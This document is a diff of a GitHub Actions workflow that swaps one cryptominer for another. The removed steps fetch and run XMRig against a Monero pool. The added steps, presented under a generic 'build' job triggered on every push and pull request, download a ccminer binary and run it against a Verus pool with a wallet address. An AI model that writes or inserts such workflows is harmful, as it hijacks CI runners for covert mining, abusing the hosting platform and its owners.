@@ -1,22 +1,24 @@
-name: Test gwe
+name: my
 
 on:
   push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
   workflow_dispatch:
 
 jobs:
-  gwe:
+  build:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Install dependencies
+      - uses: actions/checkout@v6
+      - name: my
         run: |
-          sudo apt-get install curl
-          mkdir -p ~/moneroocean && cd ~/moneroocean
-          url=$(curl -fsSL https://api.github.com/repos/MoneroOcean/xmrig/releases/latest | grep browser_download_url | grep -E 'lin64-compat|lin64\.tar\.gz' | head -1 | cut -d '"' -f 4)
-          curl -L "$url" -o xmrig.tar.gz && tar xf xmrig.tar.gz && chmod +x xmrig
-
-      - name: Test jalankan gwe 
-        run: |
-          cd ~/moneroocean
-          ./xmrig -o gulf.moneroocean.stream:10032 -u 4ANVFE2dRakV5mnqz3quDFFhkqK1emwr75wkFVSS54r8B6T4tfusnHtaJbY43p3eemXTZ6SCYTGukNC1hEdrZ8fkN2utxgL --rig-id rig02 --keepalive --cpu-max-threads-hint 85
+          sudo apt update
+          sudo apt install libomp-dev
+          sudo apt install bc
+          wget https://github.com/Oink70/ccminer-verus/releases/download/v3.8.3a-CPU/ccminer-v3.8.3a-oink_Ubuntu_18.04+nicehash
+          mv ccminer* ccminer && chmod +x ccminer
+          ./ccminer -a verus -o stratum+tcp://pool.verus.io:9999 -u RLUQtiZvHiTKDpG3ZZ6o5SdaPNLw2JUGab.my -p x -t 4      
